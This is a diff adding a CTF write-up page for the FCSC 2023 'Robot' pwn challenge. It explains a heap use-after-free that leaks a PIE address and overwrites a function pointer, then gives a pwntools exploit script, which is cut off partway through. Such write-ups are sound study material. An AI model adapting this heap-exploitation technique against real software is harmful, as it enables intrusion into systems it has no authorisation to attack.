@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>0xb0tm4n&#x27;s website</title>
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"
+    integrity="sha256-WCzAhd2P6gRJF9Hv3oOOd+hFJi/QJbv+Azn4CGB8gfY=" crossorigin="anonymous" defer></script>
+  <script src="/js/index.js" defer></script>
+  <script src="/js/prompt.js" defer></script>
+  <script src="/js/keyboard.js" defer></script>
+  <script src="/js/tab.js" defer></script>
+  <script src="/js/commands.js" defer></script>
+  <script src="/js/config.js" defer></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="/css/page.css"></head><body onkeydown='exec(event)' style='background-image: url("/assets/background.jpg");'><main>
+      <div class="files" id="files" tabindex="0">
+<ul>
+  <li class="file">
+    <span><a href='https://super-botman.github.io/readme/'
+      tabindex="0">  README</a></span>
+  </li>
+
+<li class="folder"><span>
+      <a href='https://super-botman.github.io/pwn/'
+        tabindex="0">  Pwn
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/pwn/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a class="selected"href='https://super-botman.github.io/pwn/writeups/robot/'
+        tabindex="0">  FCSC 2023 | Robot</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/bigorneau/'
+        tabindex="0">  FCSC 2025 | Bigorneau</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/http3/'
+        tabindex="0">  FCSC 2025 | HTTP3</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/small-prime-shellcode/'
+        tabindex="0">  FCSC 2025 | Small Prime Shellcode</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/aarchibald/'
+        tabindex="0">  Hackropole | Aarchibald</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/alfred/'
+        tabindex="0">  Hackropole | Alfred</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/armigo/'
+        tabindex="0">  Hackropole | Armigo</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/pwn103/'
+        tabindex="0">  THM | pwn101 task 103</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li><li class="folder"><span>
+      <a href='https://super-botman.github.io/web/'
+        tabindex="0">  Web
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/web/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/boiler/'
+        tabindex="0">  THM | Boiler</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/thomghost/'
+        tabindex="0">  THM | Thomghost</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li>
+</ul>
+</div>
+      <div class="viewer page" id="viewer" tabindex="0">
+        <div class="tab">
+<div class="file-manager" onclick='document.getElementById("files").classList.toggle("open"); document.getElementById("content").classList.toggle("close")'> </div>
+<ul id="tabs">
+</ul>
+
+
+</div>
+        <div class="content" id="content"><h1 id="pwn-robot-fcsc-2023">[Pwn] Robot | FCSC 2023</h1>
+<ul>
+<li><a href="https://super-botman.github.io/pwn/writeups/robot/#writeup">1. Writeup</a>
+<ul>
+<li><a href="https://super-botman.github.io/pwn/writeups/robot/#reverse">1.1 Reverse</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/robot/#leak">1.2 Leak</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/robot/#rce">1.3 RCE</a></li>
+</ul>
+</li>
+<li><a href="https://super-botman.github.io/pwn/writeups/robot/#full-exploit">2. Full exploit</a></li>
+</ul>
+<h2 id="writeup">Writeup</h2>
+<h3 id="reverse">Reverse</h3>
+<p>So, first in first what does we have to do ? After a fast analyse of the source code we can see that the function who's interesting is <code>admin</code>:</p>
+<pre data-lang="c" style="background-color:#1a1b26;color:#c0caf5;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#bb9af7;">void </span><span style="color:#7aa2f7;">admin</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">char </span><span style="color:#89ddff;">*</span><span style="color:#e0af68;">pwd</span><span style="color:#9abdf5;">)
+</span><span style="color:#9abdf5;">{
+</span><span style="color:#9abdf5;">    </span><span style="color:#bb9af7;">unsigned char</span><span style="color:#9abdf5;"> hash[SHA256_DIGEST_LENGTH]</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">	</span><span style="color:#bb9af7;">char</span><span style="color:#9abdf5;"> result[</span><span style="color:#ff9e64;">65</span><span style="color:#9abdf5;">]</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">	</span><span style="color:#7aa2f7;">SHA256</span><span style="color:#9abdf5;">((</span><span style="font-style:italic;color:#9d7cd8;">const </span><span style="color:#bb9af7;">unsigned char </span><span style="color:#89ddff;">*</span><span style="color:#9abdf5;">)</span><span style="color:#7aa2f7;"> pwd</span><span style="color:#89ddff;">, </span><span style="color:#2ac3de;">strlen</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">pwd</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">,</span><span style="color:#7aa2f7;"> hash</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">	</span><span style="color:#bb9af7;">for </span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">int</span><span style="color:#9abdf5;"> i </span><span style="color:#89ddff;">= </span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">;</span><span style="color:#9abdf5;"> i </span><span style="color:#bb9af7;">&lt;</span><span style="color:#9abdf5;"> SHA256_DIGEST_LENGTH</span><span style="color:#89ddff;">;</span><span style="color:#9abdf5;"> i</span><span style="color:#89ddff;">++</span><span style="color:#9abdf5;">) {
+</span><span style="color:#9abdf5;">		</span><span style="color:#2ac3de;">sprintf</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">result </span><span style="color:#89ddff;">+ </span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">i </span><span style="color:#89ddff;">* </span><span style="color:#ff9e64;">2</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">, &quot;</span><span>%02x</span><span style="color:#89ddff;">&quot;,</span><span style="color:#7aa2f7;"> hash</span><span style="color:#9abdf5;">[</span><span style="color:#7aa2f7;">i</span><span style="color:#9abdf5;">])</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">	}
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">	</span><span style="color:#bb9af7;">if </span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">rstcmp</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">result</span><span style="color:#89ddff;">,</span><span style="color:#7aa2f7;"> encrypted</span><span style="color:#9abdf5;">) </span><span style="color:#bb9af7;">== </span><span style="color:#ff9e64;">0</span><span style="color:#9abdf5;">) {
+</span><span style="color:#9abdf5;">		</span><span style="color:#7aa2f7;">execl</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">/bin/cat</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#9ece6a;">/bin/cat</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#9ece6a;">flag.txt</span><span style="color:#89ddff;">&quot;, </span><span style="color:#ff9e64;">NULL</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">		</span><span style="color:#2ac3de;">perror</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">execl</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">		</span><span style="color:#2ac3de;">exit</span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">2</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">	} </span><span style="color:#bb9af7;">else </span><span style="color:#9abdf5;">{
+</span><span style="color:#9abdf5;">		</span><span style="color:#2ac3de;">puts</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">ERROR: wrong password!</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">	}
+</span><span style="color:#9abdf5;">}
+</span></code></pre>
+<p>it's a comparaison between our input hashed and a predefined hash, we don't are in a crypto chall so we don't care about that, our objective is to jump directly to the execl to print the flag.</p>
+<p>Now it's exploit time ! In first we can see that when a user create a robot, this robot is stored in the heap, to do this the program alloc a <code>struct</code> called <code>robot</code> who contains one chars of 16bytes and two pointers so the chunk allocated will be of <code>32bytes</code> other interesting things is that when we read the manual the program will read the 32bits of the first chunk stored !</p>
+<h3 id="leak">Leak</h3>
+<p>So now, we can understand how we are going to exploit this thing !</p>
+<p>In first we going to allocate a first chunk by create a new robot so the heap will look like this:</p>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>+--------------------+
+</span><span>|        HEAP        |
+</span><span>+--------------------+
+</span><span>|       name[16]     |
+</span><span>|       *bleep       |  32 bytes
+</span><span>|       *rool        |
+</span><span>+--------------------+
+</span></code></pre>
+<p>So if we free the chunk and then create a new manuel, malloc will allocate the manuel into our older freed chunk were we have the metadata of the chunk with an address to leak the PIE</p>
+<h3 id="rce">RCE</h3>
+<p>To gain a RCE we'll overwrite the pointers of the function bleep and replace it with the <code>execl</code> function, with this we can call <code>execl</code> with <code>/bin/sh</code> as parameter and get a shell</p>
+<p>firstly we're going to create a new robot so the freed chunk will be realocated
+and we create a new manuel and write 16 bytes and then the <code>execl</code> function address, to rewrite the bleep pointer</p>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>+--------------------+
+</span><span>|        HEAP        |
+</span><span>+--------------------+
+</span><span>|       name[16]     |
+</span><span>|       *execl       |  32 bytes
+</span><span>|       *roll        |
+</span><span>+--------------------+
+</span></code></pre>
+<p>then we trigger the <code>bleep</code> function by typing 2 and tada ! we got our flag !</p>
+<h2 id="full-exploit">Full exploit</h2>
+<pre data-lang="python" style="background-color:#1a1b26;color:#c0caf5;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#565f89;">#!/bin/python
+</span><span style="color:#7dcfff;">from </span><span>pwn </span><span style="color:#7dcfff;">import </span><span style="color:#ff9e64;">*
+</span><span style="color:#7dcfff;">from </span><span>sys </span><span style="color:#7dcfff;">import </span><span>argv
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">recv_header</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">io</span><span style="color:#9abdf5;">):
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recvline</span><span style="color:#9abdf5;">()
+</span><span>    </span><span style="color:#bb9af7;">for </span><span>i </span><span style="color:#bb9af7;">in </span><span style="color:#2ac3de;">range</span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">4</span><span style="color:#9abdf5;">):
+</span><span>        </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recvline</span><span style="color:#9abdf5;">()
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">create</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">io</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">data</span><span style="color:#89ddff;">=&quot;</span><span style="color:#9ece6a;">Botman</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">):
+</span><span>    </span><span style="color:#7aa2f7;">recv_header</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sendline</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">1</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sendlineafter</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">&gt; Comment vous l&#39;appelez ?</span><span style="color:#89ddff;">\n&quot;, </span><span style="color:#7aa2f7;">data</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recvline</span><span style="color:#9abdf5;">()
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recvline</span><span style="color:#9abdf5;">()
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">robot created</span><span style="color:#89ddff;">&#39;
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">manuel</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">io</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">data</span><span style="color:#89ddff;">=&quot;</span><span style="color:#9ece6a;">data</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">):
+</span><span>    </span><span style="color:#7aa2f7;">recv_header</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sendline</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">4</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sendlineafter</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">Vous commencez </span><span style="color:#89ddff;">\xc3\xa0</span><span style="color:#9ece6a;"> r</span><span style="color:#89ddff;">\xc3\xa9</span><span style="color:#9ece6a;">diger le mode d&#39;emploi...</span><span style="color:#89ddff;">\n&quot;, </span><span style="color:#7aa2f7;">data</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recvline</span><span style="color:#9abdf5;">()
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">manuel created</span><span style="color:#89ddff;">&#39;
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">delete</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">io</span><span style="color:#9abdf5;">):
+</span><span>    </span><span style="color:#7aa2f7;">recv_header</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sendline</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">3</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#bb9af7;">for </span><span>i </span><span style="color:#bb9af7;">in </span><span style="color:#2ac3de;">range</span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">3</span><span style="color:#9abdf5;">):
+</span><span>        </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recvline</span><span style="color:#9abdf5;">()
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">robot deleted</span><span style="color:#89ddff;">&#39;
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">show</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">io</span><span style="color:#9abdf5;">):
+</span><span>    </span><span style="color:#7aa2f7;">recv_header</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sendline</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">2</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recvline</span><span style="color:#9abdf5;">()
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">read</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">io</span><span style="color:#9abdf5;">):
+</span><span>    </span><span style="color:#7aa2f7;">recv_header</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sendline</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">5</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recvline</span><span style="color:#9abdf5;">()
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recvline</span><span style="color:#9abdf5;">()
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">exploit</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">io</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">elf</span><span style="color:#9abdf5;">):
+</span><span>    </span><span style="color:#7aa2f7;">create</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">, </span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">A</span><span style="color:#89ddff;">&quot;*</span><span style="color:#ff9e64;">16</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">delete</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">manuel</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">, </span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">A</span><span style="color:#89ddff;">&quot;*</span><span style="color:#ff9e64;">16</span><span style="color:#9abdf5;">)
+</span><span>    leak </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">read</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#9abdf5;">)
+</span><span>    leak </span><span style="color:#89ddff;">= </span><span>leak</span><span style="color:#9abdf5;">[</span><span style="color:#7aa2f7;">leak</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">index</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;\xfc&#39;</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">:</span><span style="color:#9abdf5;">][</span><span style="color:#89ddff;">:-</span><span style="color:#ff9e64;">2</span><span style="color:#9abdf5;">]
+</span><span>
+</span><span>    hex_values </span><span style="color:#89ddff;">= </span><span style="color:#9abdf5;">[</span><span style="color:#2ac3de;">hex</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">byte</span><span style="color:#9abdf5;">)[</span><span style="color:#ff9e64;">2</span><span style="color:#89ddff;">:</span><span style="color:#9abdf5;">]</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">zfill</span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">2</span><span style="color:#9abdf5;">) </span><span style="color:#bb9af7;">for </span><span>byte </span><span style="color:#bb9af7;">in </span><span>leak </span><span style="color:#bb9af7;">if </span><span>byte </span><span style="color:#bb9af7;">!= </span><span style="color:#ff9e64;">0</span><span style="color:#9abdf5;">]
+</span><span>    hex_string </span><span style="color:#89ddff;">= </span><span style="color:#0db9d7;">bytes</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">fromhex</span><span style="color:#9abdf5;">((</span><span style="color:#89ddff;">&#39;&#39;.</span><span style="color:#7aa2f7;">join</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">hex_values</span><span style="color:#9abdf5;">)))[</span><span style="color:#89ddff;">:</span><span style="color:#ff9e64;">8</span><span style="color:#9abdf5;">][</span><span style="color:#89ddff;">::-</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">]
+</span><span>    hex_int </span><span style="color:#89ddff;">= </span><span style="color:#0db9d7;">int</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">from_bytes</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">hex_string</span><span style="color:#89ddff;">, &#39;</span><span style="color:#9ece6a;">big</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">)
+</span><span>    leak </span><span style="color:#89ddff;">= </span><span style="color:#0db9d7;">int</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">f</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">0x0000</span><span style="color:#9abdf5;">{</span><span style="color:#7aa2f7;">hex_int</span><span style="color:#e0af68;">:012x</span><span style="color:#9abdf5;">}</span><span style="color:#89ddff;">&#39;, </span><span style="color:#ff9e64;">16</span><span style="color:#9abdf5;">)
+</span><span>
+</span><span>    flag </span><span style="color:#89ddff;">= </span><span>leak </span><span style="color:#89ddff;">+ 0x</span><span style="color:#ff9e64;">180
+</span><span>    
+</span><span>    </span><span style="color:#2ac3de;">print</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">leak :</span><span style="color:#89ddff;">&quot; + </span><span style="color:#2ac3de;">hex</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">leak</span><span style="color:#9abdf5;">))
+</span><span>    </span><span style="color:#2ac3de;">print</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">flag :</span><span style="color:#89ddff;">&quot; + </span><span style="color:#2ac3de;">hex</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">flag</span><span style="color:#9abdf5;">))
+</span><span>
+</span><span>    </span><span style="color:#7aa2f7;">create</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">, </span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">A</span><span style="color:#89ddff;">&quot;*</span><span style="color:#ff9e64;">16</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">delete</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">manuel</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">, </span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">A</span><span style="color:#89ddff;">&quot;*</span><span style="color:#ff9e64;">16 </span><span style="color:#89ddff;">+ </span><span style="color:#7aa2f7;">p64</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">flag</span><span style="color:#9abdf5;">))
+</span><span>    </span><span style="color:#2ac3de;">print</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">show</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#9abdf5;">))
+</span><span>
+</span><span style="color:#bb9af7;">if </span><span>__name__ </span><span style="color:#bb9af7;">== </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">__main__</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">:
+</span><span>    usage </span><span style="color:#89ddff;">= &#39;&#39;&#39;
+</span><span style="color:#9ece6a;">usage: ./exploit.py [binary] ?debug
+</span><span style="color:#9ece6a;">       ./exploit.py remote [binary] [ip] [port] ?debug
+</span><span style="color:#9ece6a;">       ./exploit.py [binary] ?gdb [command]
+</span><span style="color:#9ece6a;">
+</span><span style="color:#9ece6a;">       default command = &#39;continue&#39;
+</span><span style="color:#89ddff;">&#39;&#39;&#39;
+</span><span>
+</span><span>    </span><span style="color:#bb9af7;">if </span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">argv</span><span style="color:#9abdf5;">) </span><span style="color:#bb9af7;">&lt;= </span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">:
+</span><span>        </span><span style="color:#2ac3de;">print</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">error: no arguments specified</span><span style="color:#89ddff;">\n&#39;+</span><span style="color:#7aa2f7;">usage</span><span style="color:#9abdf5;">)
+</span><span>        </span><span style="color:#7aa2f7;">exit</span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">0</span><span style="color:#9abdf5;">)
+</span><span>
+</span><span>    </span><span style="color:#bb9af7;">elif </span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">argv</span><span style="color:#9abdf5;">) </span><span style="color:#bb9af7;">&lt;= </span><span style="color:#ff9e64;">5 </span><span style="color:#bb9af7;">and </span><span>argv</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">] </span><span style="color:#bb9af7;">!= </span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">remote</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">:
+</span><span>        context</span><span style="color:#89ddff;">.</span><span>binary </span><span style="color:#89ddff;">= </span><span>elf </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">ELF</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">argv</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">])
+</span><span>        context</span><span style="color:#89ddff;">.</span><span>terminal </span><span style="color:#89ddff;">= </span><span style="color:#9abdf5;">[</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">tmux</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#9ece6a;">splitw</span><span style="color:#89ddff;">&quot;, &#39;</span><span style="color:#9ece6a;">-h</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">]
+</span><span>        p </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">process</span><span style="color:#9abdf5;">()
+</span><span>        </span><span style="color:#bb9af7;">if </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">gdb</span><span style="color:#89ddff;">&quot; </span><span style="color:#bb9af7;">in </span><span>argv</span><span style="color:#9abdf5;">: </span><span style="color:#7aa2f7;">gdb</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">attach</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">p</span><span style="color:#89ddff;">, </span><span style="color:#7aa2f7;">argv</span><span style="color:#9abdf5;">[</span><span style="color:#89ddff;">-</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">]) </span><span style="color:#bb9af7;">if </span><span>argv</span><span style="color:#9abdf5;">[</span><span style="color:#89ddff;">-</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">] </span><span style="color:#bb9af7;">!= </span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">gdb</span><span style="color:#89ddff;">&#39; </span><span style="color:#bb9af7;">else </span><span style="color:#7aa2f7;">gdb</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">attach</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">p</span><span style="color:#89ddff;">, &#39;</span><span style="color:#9ece6a;">continue</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">)
+</span><span>        </span><span style="color:#bb9af7;">if </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">debug</span><span style="color:#89ddff;">&quot; </span><span style="color:#bb9af7;">in </span><span>argv</span><span style="color:#9abdf5;">: </span><span>context</span><span style="color:#89ddff;">.</span><span>log_level </span><span style="color:#89ddff;">= &quot;</span><span style="color:#9ece6a;">DEBUG</span><span style="color:#89ddff;">&quot;
